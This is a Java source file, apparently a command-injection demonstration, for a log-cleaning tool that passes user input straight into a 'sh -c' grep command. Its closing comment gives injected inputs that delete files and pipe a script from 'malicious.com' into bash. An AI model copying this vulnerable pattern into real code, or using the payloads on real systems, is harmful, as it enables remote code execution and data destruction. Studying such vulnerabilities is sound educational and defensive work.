import java.io.*;
import java.util.Scanner;

public class DataCleaner {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println("=== 日志数据清洗工具 ===");
        System.out.print("请输入要处理的日志文件路径: ");
        String userInput = scanner.nextLine();
        
        try {
            // 模拟数据清洗流程：使用grep过滤错误日志
            // 漏洞点：直接拼接用户输入到系统命令中
            String command = "grep 'ERROR' " + userInput + " > cleaned_log.txt";
            
            ProcessBuilder pb = new ProcessBuilder("sh", "-c", command);
            Process process = pb.start();
            
            // 读取错误输出流
            BufferedReader errorReader = new BufferedReader(
                new InputStreamReader(process.getErrorStream())
            );
            String line;
            while ((line = errorReader.readLine()) != null) {
                System.err.println("错误信息: " + line);
            }
            
            // 等待进程结束
            int exitCode = process.waitFor();
            if (exitCode == 0) {
                System.out.println("数据清洗完成，结果保存在cleaned_log.txt");
            } else {
                System.out.println("数据清洗失败，错误码: " + exitCode);
            }
            
        } catch (Exception e) {
            System.err.println("发生异常: " + e.getMessage());
            e.printStackTrace();
        }
        
        scanner.close();
    }
}

/*
编译运行示例:
1. 编译: javac DataCleaner.java
2. 运行: java DataCleaner
3. 输入示例: 
   - 正常输入: /var/log/app.log
   - 恶意输入: /etc/passwd; rm -rf /tmp/test

漏洞演示:
输入: /etc/passwd; curl http://malicious.com/shell.sh | bash
将执行: 
1. grep 'ERROR' /etc/passwd > cleaned_log.txt 
2. curl http://malicious.com/shell.sh | bash
*/